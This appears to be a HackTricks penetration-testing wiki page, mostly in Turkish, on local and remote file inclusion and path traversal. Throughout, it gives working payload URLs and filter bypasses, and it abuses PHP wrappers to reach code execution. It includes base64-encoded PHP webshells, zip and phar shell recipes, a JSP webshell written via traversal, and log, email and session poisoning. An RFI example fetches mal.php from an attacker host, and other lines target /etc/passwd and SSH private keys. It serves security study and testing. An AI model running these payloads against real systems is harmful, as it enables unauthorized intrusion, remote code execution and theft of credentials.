# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Dosya uzak bir sunucudan yüklenir (Avantaj: Kodu siz yazıp sunucunun çalıştırmasını sağlayabilirsiniz). php'de bu varsayılan olarak **devre dışı**dır (**allow_url_include**).\
**Local File Inclusion (LFI):** Sunucu yerel bir dosya yükler.

The vulnerability occurs when the user can control in some way the file that is going to be load by the server.

Zafiyete açık **PHP fonksiyonları**: require, require_once, include, include_once

Bu zafiyeti istismar etmek için faydalı bir araç: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Birkaç \*nix LFI listesini birleştirip daha fazla yol ekleyerek bunu oluşturdum:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Ayrıca `/`'i `\` ile değiştirmeyi deneyin\  
Ayrıca `../../../../../` eklemeyi deneyin

/etc/password dosyasını bulmak için çeşitli teknikler kullanan bir liste (zafiyetin varlığını kontrol etmek için) şu adreste bulunabilir [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Farklı wordlists'lerin birleşimi:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Ayrıca `/`'i `\` ile değiştirmeyi deneyin\  
Ayrıca `C:/`'yi kaldırıp `../../../../../` eklemeyi deneyin

/boot.ini dosyasını bulmak için çeşitli teknikler kullanan bir liste (zafiyetin varlığını kontrol etmek için) şu adreste bulunabilir [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Linux LFI listesini kontrol edin.

## Basic LFI and bypasses

Tüm örnekler Local File Inclusion için verilmiştir ancak Remote File Inclusion'a da uygulanabilir (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences özyinelemeli olmayan şekilde çıkarıldı
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Sağlanan string'in sonuna eklenen ekstra karakterleri atlatma (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu **PHP 5.4**'ten beri çözülmüştür

### **Kodlama**

Standart olmayan kodlamalar kullanabilirsiniz, örneğin double URL encode (ve diğerleri):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Mevcut klasörden

Belki back-end klasör yolunu kontrol ediyordur:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Bir Sunucuda Dosya Sistemi Dizinlerini Keşfetme

Bir sunucunun dosya sistemi, yalnızca dosyaları değil dizinleri de tanımlamak için belirli teknikler kullanılarak özyinelemeli şekilde keşfedilebilir. Bu işlem, dizin derinliğinin belirlenmesini ve belirli klasörlerin varlığının test edilmesini içerir. Bunu başarmak için ayrıntılı bir yöntem aşağıdadır:

1. **Dizin Derinliğini Belirleme:** Mevcut dizininizin derinliğini `/etc/passwd` dosyasını başarıyla çekerek belirleyin (sunucu Linux tabanlıysa geçerlidir). Örnek bir URL aşağıdaki gibi yapılandırılmış olabilir ve derinliğin üç olduğunu gösterir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Klasörleri Sınayın:** URL'ye şüpheli klasörün adını (ör. `private`) ekleyin, ardından `/etc/passwd`'e geri dönün. Eklenen dizin seviyesi derinliği bir artırmayı gerektirir:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Sonuçları Yorumlayın:** Sunucunun yanıtı klasörün var olup olmadığını gösterir:
- **Hata / Çıktı Yok:** Belirtilen konumda `private` klasörü muhtemelen yok.
- **`/etc/passwd` içeriği:** `private` klasörünün varlığı doğrulanır.
4. **Yinelemeli Keşif:** Keşfedilen klasörler, aynı teknik veya geleneksel Local File Inclusion (LFI) yöntemleri kullanılarak alt dizinler veya dosyalar açısından daha fazla araştırılabilir.

Dosya sistemindeki farklı konumlardaki dizinleri keşfetmek için payload'u buna göre ayarlayın. Örneğin, mevcut dizinin derinliği 3 olduğunu varsayarak `/var/www/` içinde `private` dizini olup olmadığını kontrol etmek için şunu kullanın:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation, web uygulamalarında dosya yollarını manipüle etmek için kullanılan bir yöntemdir. Genellikle, dosya yollarının sonuna ek karakterler ekleyen bazı güvenlik önlemlerini atlayarak kısıtlı dosyalara erişmek için kullanılır. Amaç, güvenlik önlemi tarafından değiştirilse bile hedef dosyayı gösterecek şekilde bir dosya yolu oluşturmaktır.

In PHP, dosya sisteminin doğası gereği bir dosya yolunun çeşitli temsil biçimleri eşdeğer kabul edilebilir. Örneğin:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` ve `/etc/passwd/` aynı yol olarak değerlendirilir.
- Son 6 karakter `passwd` ise, sonuna `/` eklemek (yani `passwd/` yapmak) hedef dosyayı değiştirmez.
- Benzer şekilde, bir dosya yolunun sonuna `.php` eklenmişse (ör. `shellcode.php`), sonuna `/.` eklemek erişilen dosyayı değiştirmez.

Aşağıdaki örnekler, hassas içeriği (kullanıcı hesap bilgileri) nedeniyle sıkça hedef olan `/etc/passwd` dosyasına erişmek için path truncation'ın nasıl kullanılacağını gösterir:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda ihtiyaç duyulan traversal sayısı yaklaşık 2027 olabilir, ancak bu sayı sunucunun yapılandırmasına göre değişebilir.

- **Dot Segmentleri ve Ek Karakterlerin Kullanımı**: Traversal dizileri (`../`) ekstra nokta segmentleri ve karakterlerle birleştirilerek dosya sisteminde gezinmek için kullanılabilir; bu, sunucunun eklediği dizeleri etkisiz hale getirebilir.
- **Gerekli Traversal Sayısını Belirleme**: Deneme-yanılma yoluyla, kök dizine ve ardından `/etc/passwd`'e gitmek için gereken tam `../` dizisi sayısı bulunabilir; böylece eklenen dizeler (ör. `.php`) nötralize edilir ama hedef yol (`/etc/passwd`) korunur.
- **Sahte Bir Dizinle Başlama**: Yolun başına var olmayan bir dizin (ör. `a/`) koymak yaygın bir uygulamadır. Bu teknik, önlem amaçlı veya sunucunun yol ayrıştırma mantığının gereksinimlerini karşılamak için kullanılır.

Path truncation techniques kullanılırken, sunucunun yol ayrıştırma davranışını ve dosya sistemi yapısını anlamak çok önemlidir. Her senaryo farklı bir yaklaşım gerektirebilir ve en etkili yöntemi bulmak için genellikle test yapılması gerekir.

**Bu güvenlik açığı PHP 5.3'te giderildi.**

### **Filtre bypass hileleri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php'de varsayılan olarak bu devre dışı bırakılmıştır çünkü **`allow_url_include`** **Off.** Çalışması için **On** olması gerekir ve bu durumda sunucunuzdan bir PHP dosyasını include ederek RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Bir nedenle **`allow_url_include`** **On** ise, fakat PHP dış web sayfalarına erişimi **filtreliyorsa**, [bu yazıya göre](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), örneğin data protokolünü base64 ile kullanarak b64 PHP kodunu çözebilir ve RCE elde edebilirsiniz:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Önceki kodda, son `+.txt` eklendi çünkü saldırganın `.txt` ile biten bir string'e ihtiyacı vardı; bu yüzden string onunla biter ve b64 decode işleminden sonra o kısım sadece çöp döndürecek ve gerçek PHP kodu include edilecek (dolayısıyla çalıştırılacak).

Bir başka örnek **`php://` protokolünü kullanmayan** şöyle olabilir:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Kök element

python'da aşağıdaki gibi bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Kullanıcı **`file_name`**'e bir **mutlak yol** geçirirse, **önceki yol sadece kaldırılır**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Bu, [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)'a göre beklenen davranıştır:

> Eğer bir bileşen mutlak bir yol ise, önceki tüm bileşenler atılır ve birleştirme mutlak yol bileşeninden devam eder.

## Java Dizinlerini Listeleme

Görünüşe göre Java'da bir Path Traversal varsa ve bir dosya yerine **bir dizin isterseniz**, dizinin **listesi döndürülüyor**. Bu diğer dillerde olmayacaktır (bildiğim kadarıyla).

## İlk 25 parametre

Aşağıda local file inclusion (LFI) zafiyetine açık olabilecek ilk 25 parametrenin listesi yer alıyor (kaynak: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI — PHP wrapper'ları ve protokollerini kullanma

### php://filter

PHP filtreleri, veri okunmadan veya yazılmadan önce temel **veri üzerinde değişiklik işlemleri** gerçekleştirmeye izin verir. Filtrelerin 5 kategorisi vardır:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verideki tag'leri kaldırır ( "<" ve ">" karakterleri arasındaki her şey)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Farklı bir kodlamaya dönüştürür (`convert.iconv.<input_enc>.<output_enc>`). Desteklenen **tüm kodlamaların listesini** almak için konsolda şunu çalıştırın: `iconv -l`

> [!WARNING]
> `convert.iconv.*` dönüşüm filtresini kötüye kullanarak **rastgele metin üretebilirsiniz**, bu da rastgele metin yazmak veya include gibi bir fonksiyonun rastgele metin işlemesine olanak tanımak için faydalı olabilir. Daha fazla bilgi için bkz. [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: İçeriği sıkıştırır (çok fazla veri exfiltrasyonu yaparken faydalı)
- `zlib.inflate`: Veriyi dekomprese eder
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Kullanımdan kaldırıldı
- `mdecrypt.*` : Kullanımdan kaldırıldı
- Other Filters
- PHP'de `var_dump(stream_get_filters());` çalıştırdığınızda bir kaç **beklenmedik filtre** bulabilirsiniz:
- `consumed`
- `dechunk`: HTTP chunked encoding'i tersine çevirir
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" kısmı büyük/küçük harf duyarsızdır

### php filters'i oracle olarak kullanarak herhangi bir dosyayı okuma

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) önerilen teknik, sunucudan doğrudan çıktı alınamayan bir lokal dosyayı okumaktır. Bu teknik, **php filters kullanarak (karakter karakter) boolean exfiltration** temeline dayanır. Bunun nedeni, php filtrelerinin bir metni php'nin bir istisna atacak kadar büyük hale getirecek şekilde büyütmek için kullanılabilmesidir.

Orijinal yazıda tekniğin ayrıntılı bir açıklaması bulunuyor; burada kısa bir özet:

- Codec **`UCS-4LE`** kullanılarak metnin ilk karakterini başa bırakmak ve string boyutunun üssel olarak artmasını sağlamak.
- Bu, **ilk harf doğru tahmin edildiğinde** metni o kadar büyük bir hale getirmek için kullanılacak ki php bir **hata** tetikleyecek.
- **dechunk** filter ilk char onaltılık değilse **her şeyi silecek**, bu yüzden ilk char'ın hex olup olmadığını öğrenebiliriz.
- Bu, önceki ile (ve tahmin edilen harfe bağlı diğer filtrelerle) birleştiğinde, metnin başındaki bir harfi; onu onaltılık olmayan bir karaktere dönüştürecek yeterli dönüşümü ne zaman yaptığımızı görerek tahmin etmemize izin verir. Çünkü eğer onaltılıksa, dechunk onu silmez ve başlangıç bombası php hatası tetikler.
- Codec **convert.iconv.UNICODE.CP930** her harfi bir sonraki harfe dönüştürür (yani bu codec'ten sonra: a -> b). Bu, örneğin ilk harfin `a` olup olmadığını keşfetmemizi sağlar; çünkü bu codec'i 6 kez uygularsak a->b->c->d->e->f->g olur ve harf artık onaltılık karakter olmayacağından dechunk onu silmez ve başlangıç bombası çarpımı nedeniyle php hatası tetiklenir.
- Başlarda **rot13** gibi diğer dönüşümler kullanarak n, o, p, q, r gibi diğer karakterler de leak edilebilir (ve başka codec'ler de diğer harfleri hex aralığına taşımak için kullanılabilir).
- İlk karakter bir sayı olduğunda, onu leak edebilmek için önce base64 ile encode etmek ve sırasıyla ilk 2 harfi leak etmek gerekir.
- Sonraki sorun, **ilk harften daha fazlasını nasıl leak edeceğimizdir**. Bellek sırası filtreleri kullanarak (ör. **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**) karakterlerin sırasını değiştirmek ve metnin başka harflerini ilk pozisyona getirmek mümkündür.
- Daha fazla veri elde edebilmek için fikir, başlangıçta **convert.iconv.UTF16.UTF16** ile **2 byte junk veri üretmek**, üzerine **UCS-4LE** uygulayarak bunları **bir sonraki 2 byte ile pivotlamak** ve junk veriye kadar veriyi **silmek** (bu, başlangıçtaki metnin ilk 2 byte'ını kaldırır). Leak etmek istediğiniz bite ulaşana kadar bunu sürdürün.

Yazıda bu işlemi otomatikleştiren bir araç da paylaşıldı: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Bu wrapper, process'in açık tuttuğu file descriptor'lara erişmeyi sağlar. Açık dosyaların içeriğini exfiltrate etmek için potansiyel olarak kullanışlıdır:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ayrıca **php://stdin, php://stdout and php://stderr** kullanarak sırasıyla **file descriptors 0, 1 and 2**'ye erişebilirsiniz (bunun bir saldırıda nasıl işe yarayabileceğinden emin değilim)

### zip:// and rar://

İçinde bir PHPShell bulunan bir Zip veya Rar dosyası yükleyip ona erişin.\
rar protokolünden kötüye yararlanabilmek için **özellikle etkinleştirilmesi gerekir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Bu protokolün php yapılandırmaları **`allow_url_open`** ve **`allow_url_include`** tarafından kısıtlandığını unutmayın.

### expect://

Expect'in etkinleştirilmiş olması gerekir. Bununla kod çalıştırabilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Yükünüzü POST parametrelerinde belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyası, bir web uygulaması dosya yükleme için `include` gibi fonksiyonları kullandığında PHP kodu yürütmek için kullanılabilir. Aşağıdaki PHP kodu örneği bir `.phar` dosyasının oluşturulmasını göstermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasını derlemek için aşağıdaki komut çalıştırılmalıdır:
```bash
php --define phar.readonly=0 create_path.php
```
Çalıştırıldığında `test.phar` adlı bir dosya oluşturulacak ve bu dosya potansiyel olarak Local File Inclusion (LFI) zaafiyetlerini sömürmek için kullanılabilir.

Eğer LFI sadece dosyayı okuyup içindeki PHP kodunu çalıştırmıyorsa, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` veya `filesize()` gibi fonksiyonlar aracılığıyla deserialization vulnerability sömürülmeye çalışılabilir. Bu zaafiyet, `phar` protokolü kullanılarak dosya okunmasıyla ilişkilidir.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Çok kısa özet: PHP heap'inde bir **3 byte overflow** suistimal edilerek belirli boyuttaki serbest chunk zinciri değiştirilip herhangi bir adrese **her şeyi yazmak** mümkün kılındı; bunun için bir hook eklenip **`system`** çağrıldı.\
Ayrıca daha fazla php filter suistimal edilerek belirli boyutlarda chunk'lar alloc etmek mümkün oldu.

### More protocols

Dahil edilebilecek daha fazla olası [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Bellekte veya geçici bir dosyaya yazma (bir file inclusion saldırısında bunun nasıl faydalı olabileceği kesin değil)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Yerel dosya sistemine erişim
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL'lerine erişim
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL'lerine erişim
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Sıkıştırma akışları
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Desenle eşleşen pathnames bulma (Yazdırılabilir bir şey döndürmediği için burada pek kullanışlı değil)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ses akışları (Rastgele dosyaları okumak için kullanışlı değil)

## LFI via PHP's 'assert'

PHP'de 'assert' fonksiyonu ile ilişkili Local File Inclusion (LFI) riskleri özellikle yüksektir; çünkü assert string içindeki kodu çalıştırabilir. Bu, özellikle ".." gibi directory traversal karakterleri içeren girdiler kontrol edilip düzgün şekilde sanitize edilmezse sorun yaratır.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, traversal'ı engellemeyi amaçlasa da kazara code injection için bir vektör oluşturur. Dosya içeriklerini okumak amacıyla bunu sömürmek için bir saldırgan şunu kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer şekilde, keyfi sistem komutlarını çalıştırmak için şunu kullanabilirsiniz:
```plaintext
' and die(system("id")) or '
```
Bu **payloads**'ı **URL-encode** etmek önemlidir.

## PHP Blind Path Traversal

> [!WARNING]
> Bu teknik, **dosya yolunu kontrol ettiğiniz** ve **bir PHP fonksiyonunun** **bir dosyaya erişeceği** ama dosyanın içeriğini görmeyeceğiniz durumlarda geçerlidir (örneğin basit bir çağrı olan **`file()`**) ancak içerik gösterilmez.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Özetle, teknik dosyanın içeriğini çok **büyük** hale getirmek için **"UCS-4LE" encoding** kullanıyor, böylece dosyayı açan **PHP fonksiyonu** bir **hata** tetikleyecek.

Sonra, ilk char'ı leak etmek için filtre **dechunk** diğerleriyle birlikte (ör. **base64**, **rot13**) kullanılır ve son olarak filtreler **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** kullanılarak **başka karakterleri başa yerleştirip leak etmek** sağlanır.

**Zafiyetli olabilecek fonksiyonlar**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik detaylar için bahsedilen yazıya bakın!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Bu tür hataları bertaraf eden sertleştirmeler:
- Yolu kanonik hale getirin ve bunun izinli bir temel dizinin (allow-listed base directory) alt dizini olduğunu zorunlu kılın.
- `..`, mutlak kökler veya sürücü harfleri içeren herhangi bir yolu reddedin; tercih olarak oluşturulmuş dosya adlarını kullanın.
- Yazma işlemini düşük ayrıcalıklı bir hesap olarak çalıştırın ve yazma dizinlerini sunulan köklerden ayırın.

## Remote File Inclusion

Daha önce açıklandı, [**follow this link**](#remote-file-inclusion).

### Apache/Nginx günlük dosyası aracılığıyla

Eğer Apache veya Nginx sunucusu include fonksiyonu içinde **vulnerable to LFI** ise **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**'a erişmeyi deneyebilir, **user agent** içine veya bir **GET parameter** içine **`<?php system($_GET['c']); ?>`** gibi bir php shell koyup o dosyayı include edebilirsiniz.

> [!WARNING]
> Shell için **çift tırnak** kullanırsanız (tek tırnak yerine), çift tırnaklar "_**quote;**_" stringine dönüşecek, **PHP bir hata fırlatacak** ve **başka hiçbir şey yürütülmeyecek**.
>
> Ayrıca, **payload'u doğru yazdığınızdan** emin olun; aksi takdirde PHP log dosyasını her yüklemeye çalıştığında hata verecek ve ikinci bir şansınız olmayacak.

Bu işlem diğer loglarda da yapılabilir fakat **dikkatli olun,** log içindeki kod URL encoded olabilir ve bu Shell'i bozabilir. Header **authorisation "basic"** Base64 olarak "user:password" içerir ve loglar içinde decode edilir. PHPShell bu header içine yerleştirilebilir.\
Diğer olası log yolları:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta ile

**Bir e-posta gönderin** yerel bir hesaba (user@localhost) PHP payload'unuzu içerecek şekilde, örneğin `<?php echo system($_REQUEST["cmd"]); ?>`, ve kullanıcının postasını **`/var/mail/<USERNAME>`** veya **`/var/spool/mail/<USERNAME>`** gibi bir yol ile include etmeyi deneyin.

### Üzerinden /proc/\*/fd/\*

1. Çok sayıda shell yükleyin (örneğin: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), burada $PID işlemin PID'si (brute force ile bulunabilir) ve $FD dosya tanımlayıcısı (brute force ile bulunabilir)

### Üzerinden /proc/self/environ

Bir log dosyası gibi, payload'u User-Agent içinde gönderin; /proc/self/environ dosyasında yansıyacaktır.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Yükleme yoluyla

Bir dosya yükleyebiliyorsanız, içine sadece shell payload'u enjekte edin (ör.: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Dosyanın okunabilirliğini korumak için, resimlerin/doc/pdf'lerin üstverilerine enjekte etmek en iyisidir

### Zip dosyası yükleyerek

PHP shell içeren sıkıştırılmış bir ZIP dosyası yükleyin ve erişin:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions aracılığıyla

Web sitesinin PHP Session (PHPSESSID) kullanıp kullanmadığını kontrol edin
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarına kaydedilir
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Cookie'yi `<?php system('cat /etc/passwd');?>` olarak ayarlayın
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI'yi kullanarak PHP session fileyi include edin.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh ile

Eğer ssh aktifse hangi kullanıcının kullanıldığını kontrol edin (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id_rsa** dosyasına erişmeye çalışın

### **Üzerinden** **vsftpd** _**logları**_

